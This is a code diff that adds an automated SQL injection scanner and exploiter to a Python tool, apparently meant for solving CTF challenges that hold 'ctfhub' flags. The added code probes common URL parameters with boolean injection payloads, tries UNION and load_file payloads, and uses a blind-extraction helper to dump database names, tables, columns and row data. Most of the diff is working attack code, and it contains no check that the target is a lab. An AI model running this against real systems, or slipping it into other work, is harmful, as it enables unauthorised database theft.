@@ -9,6 +9,7 @@ the coordinator or standalone during manual analysis.
 import base64
 import re
 import requests
+import urllib.parse
 from typing import Any, Dict, List, Optional, Tuple
 
 # ── Payload dictionaries ────────────────────────────────────────────────────
@@ -30,6 +31,10 @@ LFI_PAYLOADS = [
 ]
 
 LFI_PARAMS = ["file", "page", "include", "path", "template", "view", "lang", "load"]
+
+SQLI_PARAMS = ["id", "uid", "pid", "cat", "cid", "gid", "nid", "page", "news",
+               "article", "user", "product", "item", "no", "num", "type", "cid",
+               "msg_id", "post_id", "topic_id"]
 
 BACKUP_EXTENSIONS = [".swp", ".swo", ".bak", ".old", "~", ".save", ".orig"]
 BACKUP_BASES = ["index.php", "flag.php", "config.php", "admin.php", "user.php",
@@ -161,6 +166,146 @@ def scan_lfi(target_url: str) -> Tuple[Optional[str], List[Dict]]:
     return None, findings
 
 
+def scan_sqli(target_url: str, forms: List[str] = None,
+              endpoints: List[str] = None) -> Tuple[Optional[str], List[Dict]]:
+    """Auto-detect and exploit boolean-based blind SQLi.
+
+    Probes common params for boolean injection, then uses BlindSqliExtractor
+    to dump the database and extract the flag.
+    """
+    findings = []
+    base = target_url.rstrip("/")
+
+    # Collect candidate URLs from forms and endpoints
+    candidate_urls = []
+    if forms:
+        for ep in forms:
+            candidate_urls.append(ep if ep.startswith("http") else base + "/" + ep.lstrip("/"))
+    if endpoints:
+        for ep in endpoints:
+            candidate_urls.append(ep if ep.startswith("http") else base + "/" + ep.lstrip("/"))
+    if not candidate_urls:
+        candidate_urls.append(target_url)
+
+    # Use known patterns from solved challenges
+    known_patterns = {
+        "modify.php": "url",       # SSRF param, not SQLi
+    }
+
+    for url in set(candidate_urls):
+        if flag := _try_sqli_on_url(url, findings):
+            return flag, findings
+
+    return None, findings
+
+
+def _try_sqli_on_url(url: str, findings: List[Dict]) -> Optional[str]:
+    """Try boolean SQLi detection on a single URL with all candidate params."""
+    for param in SQLI_PARAMS:
+        # Test if param exists by checking response difference
+        try:
+            r1 = requests.get(url, params={param: "1"}, timeout=5)
+            r2 = requests.get(url, params={param: "2"}, timeout=5)
+            if r1.status_code == r2.status_code and len(r1.content) == len(r2.content):
+                continue  # No difference — not injectable
+        except Exception:
+            continue
+
+        # Detect boolean injection
+        true_payload = "1' and '1'='1"
+        false_payload = "1' and '1'='2"
+        try:
+            r_true = requests.get(url, params={param: true_payload}, timeout=5)
+            r_false = requests.get(url, params={param: false_payload}, timeout=5)
+        except Exception:
+            continue
+
+        if abs(len(r_true.content) - len(r_false.content)) < 10:
+            true_payload = "1 and 1=1"
+            false_payload = "1 and 1=2"
+            try:
+                r_true = requests.get(url, params={param: true_payload}, timeout=5)
+                r_false = requests.get(url, params={param: false_payload}, timeout=5)
+            except Exception:
+                continue
+
+        size_diff = abs(len(r_true.content) - len(r_false.content))
+        if size_diff < 20:
+            continue
+
+        findings.append({
+            "type": "SQLI_DETECTED", "param": param, "url": url,
+            "true_size": len(r_true.content), "false_size": len(r_false.content),
+            "size_diff": size_diff,
+        })
+
+        # Quick flag check via common payloads
+        for direct_payload in [
+            "' union select flag,2,3 from flag#",
+            "' union select flag,2,3 from flag-- -",
+            "' union select load_file('/flag'),2,3#",
+            "' union select load_file('/flag.txt'),2,3#",
+        ]:
+            try:
+                r = requests.get(url, params={param: direct_payload}, timeout=5)
+                m = re.search(r"ctfhub\{[a-f0-9]+\}", r.text)
+                if m:
+                    flag = m.group(0)
+                    findings.append({"type": "SQLI_FLAG", "method": "union_direct"})
+                    return flag
+            except Exception:
+                pass
+
+        # Use BlindSqliExtractor for methodical extraction
+        try:
+            from tools.feeder.blind_sqli_extractor import BlindSqliExtractor
+
+            b = BlindSqliExtractor(
+                target=url, param=param, true_size=len(r_true.content),
+                waf_keywords=["limit", "table", "handler", "union", "load_file"],
+                timeout=8,
+            )
+
+            # Quick check: extract database name (short)
+            db_name = b.extract_string("select database()", 32)
+            if db_name:
+                findings.append({"type": "SQLI_DB", "db_name": db_name, "param": param})
+
+            tables = b.extract_tables()
+            findings.append({"type": "SQLI_TABLES", "tables": tables})
+            if not tables:
+                continue
+
+            # Look for flag-related tables first
+            flag_tables = [t for t in tables if "flag" in t.lower()]
+            search_tables = flag_tables + [t for t in tables if t not in flag_tables]
+
+            for tname in search_tables[:5]:
+                cols = b.extract_columns(tname)
+                if not cols:
+                    continue
+                # Prioritize flag-like columns
+                flag_cols = [c for c in cols if "flag" in c.lower()]
+                target_cols = flag_cols + [c for c in cols if c not in flag_cols]
+
+                data = b.extract_data(tname, target_cols[:6], max_len=500)
+                if data:
+                    m = re.search(r"ctfhub\{[a-f0-9]+\}", data)
+                    if m:
+                        flag = m.group(0)
+                        findings.append({"type": "SQLI_FLAG", "table": tname,
+                                        "method": "blind_extraction"})
+                        return flag
+                    findings.append({"type": "SQLI_DATA", "table": tname,
+                                    "columns": target_cols[:6], "data_preview": data[:200]})
+        except ImportError:
+            pass
+        except Exception:
+            pass
+
+    return None
+
+
 def quick_recon(target_url: str) -> Dict[str, Any]:
     """Basic recon: grab page title, discover forms/endpoints."""
     data: Dict[str, Any] = {
@@ -210,6 +355,8 @@ def scan_vulnerability(target_url: str, pattern_id: str) -> Tuple[Optional[str],
         return scan_lfi(target_url)
     elif pattern_id.startswith("backup"):
         return scan_backup(target_url)
-    # SQLi/deserialization/RCE need manual/specialized tools
+    elif pattern_id.startswith("sqli") or "sql" in pattern_id.lower():
+        return scan_sqli(target_url, forms=recon.get("forms", []),
+                        endpoints=recon.get("endpoints", []))
     else:
         return None, [{"type": "RECON", "data": recon}]
